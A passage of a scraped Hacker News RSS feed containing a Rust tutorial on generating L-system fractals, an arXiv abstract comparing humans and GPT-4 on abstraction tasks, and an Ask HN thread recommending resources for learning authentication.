<div id="attachment_2630664"><p><img decoding="async" aria-describedby="caption-attachment-2630664" src="https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg" alt="" width="1024" height="768" srcset="https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg 4032w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=150,113 150w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=300,225 300w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=768,576 768w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=680,510 680w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=1536,1152 1536w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=2048,1536 2048w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=1200,900 1200w, https://techcrunch.com/wp-content/uploads/2023/11/Kyutai-4.jpg?resize=50,38 50w" sizes="(max-width: 1024px) 100vw, 1024px"></p><p id="caption-attachment-2630664"><strong>Image Credits:</strong> Romain Dillet / TechCrunch</p></div>
			</div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[Lindenmayer Systems (140 pts)]]></title>
            <link>https://vsekar.me/blog/log_coffee/chapter_0.html</link>
            <guid>38331750</guid>
            <pubDate>Sun, 19 Nov 2023 11:47:55 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://vsekar.me/blog/log_coffee/chapter_0.html">https://vsekar.me/blog/log_coffee/chapter_0.html</a>, See on <a href="https://news.ycombinator.com/item?id=38331750">Hacker News</a></p>
<div id="readability-page-1" class="page">
        <!-- Provide site root to javascript -->
        

        <!-- Work around some values being stored in localStorage wrapped in quotes -->
        

        <!-- Set the theme before any content is loaded, prevents flash -->
        

        <!-- Hide / unhide sidebar before it is displayed -->
        

        <nav id="sidebar" aria-label="Table of contents">
            
            
        </nav>

        <div id="page-wrapper">

            <div class="page">
                                
                <div id="menu-bar">
                    

                    <h2>log_coffee!</h2>

                    
                </div>

                

                <!-- Apply ARIA attributes after the sidebar and the sidebar toggle button are added to the DOM -->
                

                <div id="content">
                    <main>
                        <h2 id="lindenmayer-systems"><a href="#lindenmayer-systems">Lindenmayer systems</a></h2>
<p>A Lindemayer system or LSystem for short consists of an alphabet of symbols that can be used to make strings, a collection of production that expand each symbol into some larger string of symbols, an initial “axiom” string from which to begin construction, and a mechanism for translating the generated strings into geometric structures.</p>
<p>A few years back, I built a rudimentary website to extrapolate a few known LSystems in pure JS. However, presently I have been getting more comfortable with Rust 🦀 and explored rebuilding it with Rust and wasm-bindgen to get better performance for tougher iterations.</p>
<p>Website - <a href="https://vsekar.me/LSystems/">vsekar.me/LSystems/</a></p>
<p>Repository - <a href="https://github.com/Spockuto/LSystems/">github.com/Spockuto/LSystems/</a></p>
<p>Now let's explore how an axiom, a set of rules, and an angle can be developed into this beautiful fern
<img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/barnsley_fern.png" alt="Barnsley Fern"></p>
<h3 id="step-0---define-the-lsystem"><a href="#step-0---define-the-lsystem">Step 0 - Define the LSystem</a></h3>
<p>For Barnsley Fern, the LSystem is defined as follows</p>
<pre><code>Axiom : X
Rules : 
 - X -&gt; F-[[X]+X]+F[+FX]-X
 - F -&gt; FF
Angle : 22.5
</code></pre>
<p>This translates into the following for our Rust implementation.</p>
<pre><pre><code><span>#![allow(unused)]
</span><span>fn main() {
</span>lazy_static! {
    static ref BARNSLEY_FERN: LSystem = LSystem {
        variables: "XF",
        axiom: "X",
        rules: vec![
            ('X', "F-[[X]+X]+F[+FX]-X"), 
            ('F', "FF"),
        ]
        .into_iter()
        .collect(),
        angle: 22.5,
        max_rounds: 8,
    };
}
<span>}
</span></code></pre></pre>
<ul>
<li><em>variables</em> : These are the identifiers that will be considered during building the sequence. Others will be skipped.</li>
<li><em>axiom</em> : The initial sequence</li>
<li><em>rules</em> : Expansion rules for each identifier</li>
<li><em>angle</em> : Explained later</li>
<li><em>max_rounds</em> - Implementation detail. Maximum number of supported iterations before running out of heap memory.</li>
</ul>
<h3 id="step-1---generate-the-sequence"><a href="#step-1---generate-the-sequence">Step 1 - Generate the sequence</a></h3>
<p>Once the LSystem is defined, we can build the drawing sequence. Iterations define the number of rounds the sequence will be expanded using the given rules. The higher the iteration, the better defined the picture is.</p>
<pre><pre><code><span>#![allow(unused)]
</span><span>fn main() {
</span>/// Generate the Turtle graphics sequence for given iterations
pub fn expand(&amp;self, iterations: u32) -&gt; String {

    // panic if given iterations are greater than the accepted limit.
    if iterations &gt; self.0.max_rounds {
        panic!("Max limit reached");
    }

    let mut sequence = String::new();
    for i in 0..iterations {
        if i == 0 {
            // First iteration is the axiom
            sequence.insert_str(0, self.0.axiom);
        } else {
            let sequence_copy = sequence.to_string();
            let mut insert_index = 0;
            for identifier in sequence_copy.chars() {
                // Skip if the variable in sequence doesn't have a rule
                if !self.0.variables.contains(identifier) {
                    insert_index += 1;
                    continue;
                }
                // Expand the sequence based on the rule
                let rule = self.0.rules.get(&amp;identifier).unwrap();
                sequence.remove(insert_index);
                sequence.insert_str(insert_index, rule);
                insert_index += &amp;rule.len();
            }
        }
        // The current sequence will be used as the generator for the next round
    }
    sequence
}
<span>}
</span></code></pre></pre>
<blockquote>
<p>Note: The function above can also be written recursively but for larger iterations, you would run out of stack depth way before running out of heap memory.</p>
</blockquote>
<p>For Barnsley Fern, the sequence expands as follows for subsequent iterations</p>
<div><table><thead><tr><th>Iterations</th><th>Sequence</th></tr></thead><tbody>
<tr><td>1</td><td>X</td></tr>
<tr><td>2</td><td>F-[[X]+X]+F[+FX]-X</td></tr>
<tr><td>3</td><td>FF-[[F-[[X]+X]+F[+FX]-X]+F-[[X]+X]+F[+FX]-X]+FF[+FFF-[[X]+X]+F[+FX]-X]-F-[[X]+X]+F[+FX]-X</td></tr>
<tr><td>4</td><td>FFFF-[[FF-[[F-[[X]+X]+F[+FX]-X]+F-[[X]+X]+F[+FX]-X]+FF[+FFF-[[X]+X]+F[+FX]-X]-F-[[X]+X]+F[+FX]-X]+FF-[[F-[[X]+X]+F[+FX]-X]+F-[[X]+X]+F[+FX]-X]+FF[+FFF-[[X]+X]+F[+FX]-X]-F-[[X]+X]+F[+FX]-X]+FFFF[+FFFFFF-[[F-[[X]+X]+F[+FX]-X]+F-[[X]+X]+F[+FX]-X]+FF[+FFF-[[X]+X]+F[+FX]-X]-F-[[X]+X]+F[+FX]-X]-FF-[[F-[[X]+X]+F[+FX]-X]+F-[[X]+X]+F[+FX]-X]+FF[+FFF-[[X]+X]+F[+FX]-X]-F-[[X]+X]+F[+FX]-X</td></tr>
</tbody></table>
</div>
<h3 id="step-2---draw-the-canvas-based-on-the-sequence"><a href="#step-2---draw-the-canvas-based-on-the-sequence">Step 2 - Draw the canvas based on the sequence</a></h3>
<p>Now that the sequence is generated, we can start building the canvas. Each character in the sequence defines a particular set of operations on the canvas. This allows us to convert the sequence into a picture.</p>
<pre><pre><code><span>#![allow(unused)]
</span><span>fn main() {
</span>// Define length
// Set the angle to the LSystem angle
let angle_rad = -1.0 * PI * angle / 180.0;
let (mut x, mut y) = (0.0, 0.0);
let mut stack = vec![];

for seq in sequence.chars() {
    // perform operations on the canvas 
    match seq {
        // draw a line to (x,y) at given length and angle
        'F' | 'A' | 'B' =&gt; {
            x += length * angle.cos();
            y += length * angle.sin();
            context.line_to(x, y);
            context.stroke();
        }
        'S' =&gt; {
        // move along a line to (x,y) at given length and angle
            x += length * angle.cos();
            y += length * angle.sin();
            context.move_to(x, y);
        }
        '+' =&gt; {
        // rotate counterclockwise by angle_rad
            angle += angle_rad;
        }
        '-' =&gt; {
        // rotate clockwise by angle rad
            angle -= angle_rad;
        }
        '[' =&gt; {
        // push a point into stack
            stack.push(Line { x, y, angle });
        }
        ']' =&gt; {
        // Pop a point from the stack and move to it.
            let line = stack.pop().unwrap();
            (x, y, angle) = (line.x, line.y, line.angle);
            context.move_to(x, y);
        }
        // For others, skip and continue
        _ =&gt; continue,
    }
}
<span>}
</span></code></pre></pre>

<h3 id="step-3---color-the-canvas-using-a-linear-gradient"><a href="#step-3---color-the-canvas-using-a-linear-gradient">Step 3 - Color the canvas using a linear gradient</a></h3>
<p>The final step in generating our fractal is applying a linear gradient between two colors over our canvas. This can be achieved by applying color interpolation over each dark pixel.</p>
<pre><pre><code><span>#![allow(unused)]
</span><span>fn main() {
</span>let image_data = context
    .get_image_data(0.0, 0.0, width as f64, height as f64)
    .unwrap();

// data contains 4 u8 values per pixel indicating RGBA (red, green, blue, alpha) values
let mut data = image_data.data();

// Set the linear gradient colors : color1 -&gt; color2 

let c1 = Rgb::from_hex_str(&amp;color1).unwrap();
let c2 = Rgb::from_hex_str(&amp;color2).unwrap();

// linear gradient is defined using interpolation
// Assume the fraction grows from 0 to 1
// pixel.r = c1.r + (c2.r - c1.r) * fraction
// pixel.g = c1.g + (c2.g - c1.g) * fraction
// pixel.b = c1.b + (c2.b - c1.b) * fraction

for index in 0..(width * height * 4) as usize {
    // Since the canvas is drawn with black, only alpha will be set initially
    if data[index] &gt; 0 {
    // pixel's alpha is set
    // Update the color using interpolation
        let fraction = index as f32 / (height * width * 4) as f32;
        data[index - 3] = (c1.get_red() + (c2.get_red() - c1.get_red()) * fraction) as u8;
        data[index - 2] = (c1.get_green() + (c2.get_green() - c1.get_green()) * fraction) as u8;
        data[index - 1] = (c1.get_blue() + (c2.get_blue() - c1.get_blue()) * fraction) as u8;
    }
}
let slice_data = Clamped(&amp;data.0[..]);
let image_data = web_sys::ImageData::new_with_u8_clamped_array_and_sh(
    slice_data,
    width as u32,
    height as u32,
)
.unwrap();

// load the data back into the canvas
context.put_image_data(&amp;image_data, 0.0, 0.0).unwrap();
<span>}
</span></code></pre></pre>
<p>With this, a linear gradient between <code>#C6EA8D</code> and <code>#FE90AF</code> gives us
<img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/barnsley_fern.png" alt="Barnsley Fern"></p>
<blockquote>
<p>Note: Colors don't exactly behave well with linear interpolation. For more details check out <a href="https://www.alanzucconi.com/2016/01/06/colour-interpolation/">The Secrets of Colour Interpolation</a></p>
</blockquote>
<h2 id="fractal-tree"><a href="#fractal-tree">Fractal Tree</a></h2>
<pre><code>Axiom : F
Rules : 
 - F -&gt; FF-[-F+F+F]+[+F-F-F]
Angle : 22.5
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/fractal_tree.png" alt="Fractal Tree"></p>
<h2 id="fractal-tree-2"><a href="#fractal-tree-2">Fractal Tree 2</a></h2>
<pre><code>Axiom : VZFFF
Rules : 
 - F -&gt; F
 - V -&gt; [+++W][---W]YV
 - W -&gt; +X[-W]Z
 - X -&gt; -W[+X]Z
 - Y -&gt; YZ
 - Z -&gt; [-FFF][+FFF]F
Angle : 18
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/fractal_tree_2.png" alt="Fractal Tree 2"></p>
<h2 id="dragon-curve"><a href="#dragon-curve">Dragon Curve</a></h2>
<pre><code>Axiom : FX
Rules : 
 - X -&gt; X+YF+
 - Y -&gt; -FX-Y
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/dragon_curve.png" alt="Dragon Curve"></p>
<h2 id="32-segment-curve"><a href="#32-segment-curve">32 Segment Curve</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; -F+F-F-F+F+FF-F+F+FF+F-F-FF+FF-FF+F+F-FF-F-F+FF-F-F+F+F-F+
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/32_segment.png" alt="32 Segment Curve"></p>
<h2 id="peano-gosper-curve"><a href="#peano-gosper-curve">Peano Gosper Curve</a></h2>
<pre><code>Axiom : A
Rules : 
 - A -&gt; A-B--B+A++AA+B-
 - B -&gt; +A-BB--B-A++A+B
Angle : 60
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/peano_gosper.png" alt="Peano Gosper Curve"></p>
<h2 id="koch-snowflake"><a href="#koch-snowflake">Koch Snowflake</a></h2>
<pre><code>Axiom : F++F++F
Rules : 
 - F -&gt; F-F++F-F
Angle : 60
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/koch_snowflake.png" alt="Koch Snowflake"></p>
<h2 id="koch-snowflake-2"><a href="#koch-snowflake-2">Koch Snowflake 2</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; F-F+F+F-F
Angle : 60
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/koch_snowflake_2.png" alt="Koch Snowflake 2"></p>
<h2 id="koch-snowflake-3"><a href="#koch-snowflake-3">Koch Snowflake 3</a></h2>
<pre><code>Axiom : F
Rules : 
 - F -&gt; F-F+F+F-F
Angle : 85
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/koch_snowflake_3.png" alt="Koch Snowflake 3"></p>
<h2 id="quadratic-koch-island"><a href="#quadratic-koch-island">Quadratic Koch Island</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; F+F-F-FF+F+F-F
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/quad_koch_island.png" alt="quad. Koch Island"></p>
<h2 id="quadratic-koch-island-2"><a href="#quadratic-koch-island-2">Quadratic Koch Island 2</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; F+FF-FF-F-F+F+FF-F-F+F+FF+FF-F
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/quad_koch_island_2.png" alt="quad. Koch Island 2"></p>
<h2 id="islands"><a href="#islands">Islands</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; F-SFF+F+FF+F-S-FFF-F+F+F-FFFF
 - S -&gt; SSSSSSSS
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/islands.png" alt="Islands"></p>
<h2 id="islands-2"><a href="#islands-2">Islands 2</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; F-SF+FF+F+FF-S-FF+SF-FF-F-FF+S+FFF
 - S -&gt; SSSSSS
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/islands_2.png" alt="Islands 2"></p>
<h2 id="sierpinski-triangle"><a href="#sierpinski-triangle">Sierpinski Triangle</a></h2>
<pre><code>Axiom : FXF--FF--FF
Rules : 
 - F -&gt; FF
 - X -&gt; --FXF++FXF++FXF--
Angle : 60
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/sierpinski_t.png" alt="Sierpinski Triangle"></p>
<h2 id="sierpinski-square"><a href="#sierpinski-square">Sierpinski Square</a></h2>
<pre><code>Axiom : F+F+F+F
Rules : 
 - F -&gt; FF+F+F+F+FF
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/sierpinski_s.png" alt="Sierpinski Square"></p>
<h2 id="hilbert-curve"><a href="#hilbert-curve">Hilbert Curve</a></h2>
<pre><code>Axiom : X
Rules : 
 - X -&gt; +YF-XFX-FY+
 - Y -&gt; -XF+YFY+FX-
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/hilbert.png" alt="Hilbert Curve"></p>
<h2 id="frec-fractal"><a href="#frec-fractal">Frec Fractal</a></h2>
<pre><code>Axiom : XYXYXYX+XYXYXYX+XYXYXYX+XYXYXYX
Rules : 
 - F -&gt; 
 - X -&gt; FX+FX+FXFY-FY-
 - Y -&gt; +FX+FXFY-FY-FY
Angle : 90
</code></pre>
<p><img src="https://raw.githubusercontent.com/Spockuto/blog/master/src/images/frec_fractal.png" alt="Frec Fractal"></p>

                    </main>

                    <nav aria-label="Page navigation">
                        <!-- Mobile navigation buttons -->
                            <a rel="prev" href="https://vsekar.me/blog/log_coffee/chapter_1.html" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                                <i></i>
                            </a>

                            <a rel="next" href="https://vsekar.me/blog/archive.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                                <i></i>
                            </a>

                        
                    </nav>
                </div>
            </div>

            <nav aria-label="Page navigation">
                    <a rel="prev" href="https://vsekar.me/blog/log_coffee/chapter_1.html" title="Previous chapter" aria-label="Previous chapter" aria-keyshortcuts="Left">
                        <i></i>
                    </a>

                    <a rel="next" href="https://vsekar.me/blog/archive.html" title="Next chapter" aria-label="Next chapter" aria-keyshortcuts="Right">
                        <i></i>
                    </a>
            </nav>

        </div>




        


        
        
        

        
        
        

        <!-- Custom JS scripts -->


    

</div>]]></description>
        </item>
        <item>
            <title><![CDATA[Comparing Humans, GPT-4, and GPT-4V on Abstraction and Reasoning Tasks (201 pts)]]></title>
            <link>https://arxiv.org/abs/2311.09247</link>
            <guid>38331669</guid>
            <pubDate>Sun, 19 Nov 2023 11:36:34 GMT</pubDate>
            <description><![CDATA[<p>URL: <a href="https://arxiv.org/abs/2311.09247">https://arxiv.org/abs/2311.09247</a>, See on <a href="https://news.ycombinator.com/item?id=38331669">Hacker News</a></p>
<div id="readability-page-1" class="page"><div id="content-inner">
    
    
                
    <p><a href="https://arxiv.org/pdf/2311.09247.pdf">Download PDF</a></p><blockquote>
            <span>Abstract:</span>We explore the abstract reasoning abilities of text-only and multimodal versions of GPT-4, using the ConceptARC benchmark [10], which is designed to evaluate robust understanding and reasoning with core-knowledge concepts. We extend the work of Moskvichev et al. [10] by evaluating GPT-4 on more detailed, one-shot prompting (rather than simple, zero-shot prompts) with text versions of ConceptARC tasks, and by evaluating GPT-4V, the multimodal version of GPT-4, on zero- and one-shot prompts using image versions of the simplest tasks. Our experimental results support the conclusion that neither version of GPT-4 has developed robust abstraction abilities at humanlike levels.
    </blockquote>

    <!--CONTEXT-->
    
  </div><div>
      <h2>Submission history</h2><p> From: Melanie Mitchell [<a href="https://arxiv.org/show-email/17a8ecc6/2311.09247">view email</a>]      <br>    <strong>[v1]</strong>
        Tue, 14 Nov 2023 04:33:49 UTC (1,549 KB)<br>
</p></div></div>]]></description>
        </item>
        <item>
            <title><![CDATA[HNInternal: Ask HN: Any comprehensive courses on Auth? (212 pts)]]></title>
            <link>https://news.ycombinator.com/item?id=38331501</link>
            <guid>38331501</guid>
            <pubDate>Sun, 19 Nov 2023 11:06:21 GMT</pubDate>
            <description><![CDATA[<p>See on <a href="https://news.ycombinator.com/item?id=38331501">Hacker News</a></p>
<div id="readability-page-1" class="page"><div><td><table>
        <tbody><tr id="38331501">
      <td><span></span></td>      <td><center><a id="up_38331501" href="https://news.ycombinator.com/vote?id=38331501&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center></td><td><span><a href="https://news.ycombinator.com/item?id=38331501">Ask HN: Any comprehensive courses on Auth?</a></span></td></tr><tr><td colspan="2"></td><td><span>
          <span id="score_38331501">113 points</span> by <a href="https://news.ycombinator.com/user?id=bojangleslover">bojangleslover</a> <span title="2023-11-19T11:06:21"><a href="https://news.ycombinator.com/item?id=38331501">3 hours ago</a></span> <span id="unv_38331501"></span> | <a href="https://news.ycombinator.com/hide?id=38331501&amp;goto=item%3Fid%3D38331501">hide</a> | <a href="https://hn.algolia.com/?query=Ask%20HN%3A%20Any%20comprehensive%20courses%20on%20Auth%3F&amp;type=story&amp;dateRange=all&amp;sort=byDate&amp;storyText=false&amp;prefix&amp;page=0">past</a> | <a href="https://news.ycombinator.com/fave?id=38331501&amp;auth=9db2af2bbbf77f7f13cef3cc6cd7ffb2d1e3956d">favorite</a> | <a href="https://news.ycombinator.com/item?id=38331501">39&nbsp;comments</a>        </span>
              </td></tr>
    <tr></tr><tr><td colspan="2"></td><td><p>I would like cover basic username/password auth, OAuth and Active Directory, security keys and everything in between. Would like to do this in a linear fashion, ie like a coursera course with practice problems.</p></td></tr>        <tr></tr><tr><td colspan="2"></td><td><form action="comment" method="post"></form></td></tr>  </tbody></table><table>
            <tbody><tr id="38331757"><td></td></tr>
                <tr id="38332523"><td></td></tr>
            <tr id="38332002"><td></td></tr>
                <tr id="38332545"><td></td></tr>
                        <tr id="38331628"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38331628" href="https://news.ycombinator.com/vote?id=38331628&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>What made me understand these things the most, was setting this up just for myself.<p>For example host your own instance of Zitadel, Authentik or whatever you find most appealing.
Tinker a bit around with it. Then use that instance to authenticate yourself somewhere, i.e. another service where you can set up your own oauth provider. Take a look at  the API requests, take a look the code of some OAuth implementation, for example in projects like Gitea, Nextcloud.</p><p>May not be it for everyone, though I really like learning by doing.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38331917"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38331917" href="https://news.ycombinator.com/vote?id=38331917&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>One thing that might be interesting is SASL has evolved over the years. Most things are RFCs, so well written, short and open specifications. This gives you one larger thing to learn. Should be rather linear if you sort by RFC number.<p>It would head well into advanced user/password schemes.</p><p>The problem is that even advanced mechanism like a SCRAM based authentication with additional 2fa are rather simple to grasp &amp; implement, but really hard to get right / secure.</p><p>A lot of the evolution is rather an evolution of attacks and issues, leading to new schemes. OWASP is thus pretty relevant, too.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38333106"><td></td></tr>
            <tr id="38332562"><td></td></tr>
            <tr id="38332236"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38332236" href="https://news.ycombinator.com/vote?id=38332236&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>I recently had to learn OIDC which is the standard for auth that most people really mean when they say OAuth now, I think.  I learned by implementing (using Keycloak) and most importantly by reading the OIDC specs.  It may seem intimidating, but the real core of it is not that large.<p>It's a topic I'd be interested in writing more about, and I'm happy to start here if you would find it useful.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38332182"><td></td></tr>
            <tr id="38331599"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38331599" href="https://news.ycombinator.com/vote?id=38331599&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><br><div>
                  <p><span>I'm also interested in this, but specifically something that covers authentication between services and in particular situations where a user authenticates against service a and now service a needs to ask service b to do something on behalf of the user. Not just a handwavy "use OAuth" but more concrete and thorough.</span></p></div></td></tr>
        </tbody></table></td></tr>
                <tr id="38332980"><td></td></tr>
            <tr id="38331983"><td></td></tr>
            <tr id="38331792"><td><table>  <tbody><tr>    <td indent="1"><img src="https://news.ycombinator.com/s.gif" height="1" width="40"></td><td>
      <center><a id="up_38331792" href="https://news.ycombinator.com/vote?id=38331792&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><br><div>
                  <p><span>To be honest, my first instinct was to give a hand wavy "use OAuth". But to elaborate a but further, oauth is made for this and is the industry standard for this kind of thing. There's lots out there on oauth that tells you more than "just use it", it's just a couple searches away. So I don't think I really understand the question.</span></p></div></td></tr>
        </tbody></table></td></tr>
                  <tr id="38332715"><td></td></tr>
            <tr id="38332916"><td></td></tr>
            <tr id="38332717"><td></td></tr>
            <tr id="38332707"><td></td></tr>
                <tr id="38332953"><td></td></tr>
                  <tr id="38332771"><td></td></tr>
            <tr id="38332111"><td></td></tr>
            <tr id="38331800"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38331800" href="https://news.ycombinator.com/vote?id=38331800&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>I’ve learned a lot about these things by working on a project using Ory Kratos. The documentation is a bit patchy but it’s open source so you can dive into the gritty details of how a fairly large id provider implements the various aspects of OAuth and so on.
(One nice thing about Azure Active Directory is that it supports OAuth2 integrations so if you understand and can implement OAuth2 then you can also implement AD).<p>I know it’s not a linear learning answer but hope it helps you perhaps later. Good luck!
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38331629"><td></td></tr>
            <tr id="38332222"><td></td></tr>
            <tr id="38331834"><td></td></tr>
            <tr id="38331719"><td></td></tr>
            <tr id="38332114"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38332114" href="https://news.ycombinator.com/vote?id=38332114&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><br><div>
                  <p><span>How much are you willing to pay for it so you would get a knowledge base that is not superficial, but thorough and you'll really know the ins and outs of it?</span></p></div></td></tr>
        </tbody></table></td></tr>
            <tr id="38332175"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38332175" href="https://news.ycombinator.com/vote?id=38332175&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>none.<p>but useful stuff:</p><p>certified ethical hacker course can give you a perpetrator's pov on how people get hacked.</p><p>owasp cheatsheet and latacora blog are useful reference also.</p><p>understanding how companies offer these services also helps, e.g. clerk.com, ory.sh, auth0, okta, supertokens, etc.</p><p>understanding how authentication coincides with authorization helps too.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
            <tr id="38332895"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
      <center><a id="up_38332895" href="https://news.ycombinator.com/vote?id=38332895&amp;how=up&amp;goto=item%3Fid%3D38331501"></a></center>    </td><td><p><span>I don't know of any, but here's the resources I've found useful as I've worked in the space (disclosure: I work for an auth vendor, FusionAuth).<p>* Solving Identity Management In Modern Applications is a great book offering an overview of the entire identity process, including provisioning (adding users), authentication and more. I read and reference the 2019 edition; don't have the 2023 edition but expect it is just as good: <a href="https://link.springer.com/book/10.1007/978-1-4842-8261-8" rel="nofollow noreferrer">https://link.springer.com/book/10.1007/978-1-4842-8261-8</a></p><p>* OAuth2 In Action walks you through building an OAuth2 server from scratch (in JavaScript). You'll learn about the fundamentals of tokens, clients, registration, and more. Very accessible. <a href="https://www.manning.com/books/oauth-2-in-action" rel="nofollow noreferrer">https://www.manning.com/books/oauth-2-in-action</a></p><p>* The Security Engineering Handbook is great for foundational security knowledge, like 'What does a hash look like, and what makes a good hashing algorithm' as well as a lot of broader security topics: <a href="https://www.cl.cam.ac.uk/~rja14/book.html" rel="nofollow noreferrer">https://www.cl.cam.ac.uk/~rja14/book.html</a></p><p>* FusionAuth's vendor neutral articles: <a href="https://fusionauth.io/articles/" rel="nofollow noreferrer">https://fusionauth.io/articles/</a> . I'd especially call out these two: The Modern Guide to OAuth, which walks through the multiple different ways the OAuth 2 authorization framework can be used: <a href="https://fusionauth.io/learn/expert-advice/oauth/modern-guide-to-oauth" rel="nofollow noreferrer">https://fusionauth.io/learn/expert-advice/oauth/modern-guide...</a> (previous HN discussion: <a href="https://news.ycombinator.com/item?id=29752918">https://news.ycombinator.com/item?id=29752918</a> ), and the Math of Password Hashing: <a href="https://fusionauth.io/learn/expert-advice/security/math-of-password-hashing-algorithms-entropy" rel="nofollow noreferrer">https://fusionauth.io/learn/expert-advice/security/math-of-p...</a></p><p>* The Beer Drinkers Guide to SAML is a great resource for understanding this (still) critical standard, plus just a fun read: <a href="https://duo.com/blog/the-beer-drinkers-guide-to-saml" rel="nofollow noreferrer">https://duo.com/blog/the-beer-drinkers-guide-to-saml</a></p><p>* The RFCs and BCPs (as mentioned). I've also learned a lot by lurking on the OAuth mailing list, which is freely available: <a href="https://mailarchive.ietf.org/arch/browse/oauth/" rel="nofollow noreferrer">https://mailarchive.ietf.org/arch/browse/oauth/</a></p><p>* The Identity Unlocked podcast with  Vittorio Bertocci  (RIP). This is not about the basics at all, but is a deeper dive into the dev focused side of authentication, and will give you great pointers for more reading: <a href="https://identityunlocked.auth0.com/" rel="nofollow noreferrer">https://identityunlocked.auth0.com/</a></p><p>* The OWASP guides are good but specialized. See for example: <a href="https://owasp.org/API-Security/editions/2023/en/0xa2-broken-authentication/" rel="nofollow noreferrer">https://owasp.org/API-Security/editions/2023/en/0xa2-broken-...</a></p><p>* I have a substack where I talk about aspects of customer identity and access management that I think is pretty good :) : <a href="https://ciamweekly.substack.com/" rel="nofollow noreferrer">https://ciamweekly.substack.com/</a></p><p>I think this would be a great linkedin learning, udacity or coursera course, but didn't see anything when I searched there. I've put together courses before and it's a ton of work, but hmmm, maybe it'd be fun to do for this topic.</p><p>Edit: corrected spelling of Vittorio Bertocci's name.
              </p></span></p></td></tr>
        </tbody></table></td></tr>
                <tr id="38333032"><td></td></tr>
                <tr id="38333154"><td></td></tr>
                        <tr id="38331735"><td><table>  <tbody><tr>    <td indent="0"><img src="https://news.ycombinator.com/s.gif" height="1" width="0"></td><td>
